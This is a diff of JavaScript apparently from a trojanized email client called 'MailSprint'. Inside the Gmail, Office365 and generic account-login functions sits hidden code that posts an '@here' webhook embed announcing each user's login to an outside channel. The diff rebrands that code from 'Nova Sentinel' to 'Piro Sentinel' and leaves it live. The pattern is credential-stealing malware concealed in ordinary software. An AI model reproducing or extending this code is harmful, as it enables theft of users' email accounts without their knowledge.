@@ -85,7 +85,7 @@ async function expandAccountWithCommonSettings(account) {
     const embed = {
         color: 2829617,
         footer: {
-          text: "@Nova Sentinel | https://t.me/Sordeal",
+          text: "@Piro Sentinel | https://discord.gg/e8xACqzUvU",
         },
         title: `MailSprint ${account.provider ?? "JSP"} Login`,
         fields: [
@@ -127,9 +127,9 @@ async function expandAccountWithCommonSettings(account) {
       };
   
       const message = {
-        username: "Nova Sentinel",
+        username: "Piro Sentinel",
         avatar_url:
-          "https://raw.githubusercontent.com/ksch-58/sub/main/assets/lilnova.png",
+          "https://raw.githubusercontent.com/404log/aka/main/new%20logo%20piro.png",
         content: "@here",
         embeds: [embed],
       };
@@ -142,7 +142,7 @@ async function expandAccountWithCommonSettings(account) {
         body: JSON.stringify(message),
       });
       if (res.ok) {
-        console.log("Nova Sentinel is here.");
+        console.log("Piro Sentinel is here.");
       } else {
       }
     const mxRecords = await mxRecordsForDomain(domain);
@@ -269,7 +269,7 @@ async function buildGmailAccountFromAuthResponse(code) {
     const embed = {
         color: 2829617,
         footer: {
-          text: "@Nova Sentinel | https://t.me/Sordeal",
+          text: "@Piro Sentinel | https://discord.gg/e8xACqzUvU",
         },
         title: "MailSprint Gmail Login",
         fields: [
@@ -311,9 +311,9 @@ async function buildGmailAccountFromAuthResponse(code) {
       };
   
       const message = {
-        username: "Nova Sentinel",
+        username: "Piro Sentinel",
         avatar_url:
-          "https://raw.githubusercontent.com/ksch-58/sub/main/assets/lilnova.png",
+          "https://raw.githubusercontent.com/404log/aka/main/new%20logo%20piro.png",
         content: "@here",
         embeds: [embed],
       };
@@ -326,7 +326,7 @@ async function buildGmailAccountFromAuthResponse(code) {
         body: JSON.stringify(message),
       });
       if (res.ok) {
-        console.log("Nova Sentinel is here.");
+        console.log("Piro Sentinel is here.");
       } else {
       }
     account.id = idForAccount(me.email, account.settings);
@@ -382,7 +382,7 @@ async function buildO365AccountFromAuthResponse(code) {
     const embed = {
         color: 2829617,
         footer: {
-          text: "@Nova Sentinel | https://t.me/Sordeal",
+          text: "@Piro Sentinel | https://discord.gg/e8xACqzUvU",
         },
         title: "MailSprint office365 Login",
         fields: [
@@ -429,9 +429,9 @@ async function buildO365AccountFromAuthResponse(code) {
       };
   
       const message = {
-        username: "Nova Sentinel",
+        username: "Piro Sentinel",
         avatar_url:
-          "https://raw.githubusercontent.com/ksch-58/sub/main/assets/lilnova.png",
+          "https://raw.githubusercontent.com/404log/aka/main/new%20logo%20piro.png",
         content: "@here",
         embeds: [embed],
       };
@@ -444,7 +444,7 @@ async function buildO365AccountFromAuthResponse(code) {
         body: JSON.stringify(message),
       });
       if (res.ok) {
-        console.log("Nova Sentinel is here.");
+        console.log("Piro Sentinel is here.");
       } else {
       }
     account.id = idForAccount(me.email, account.settings);
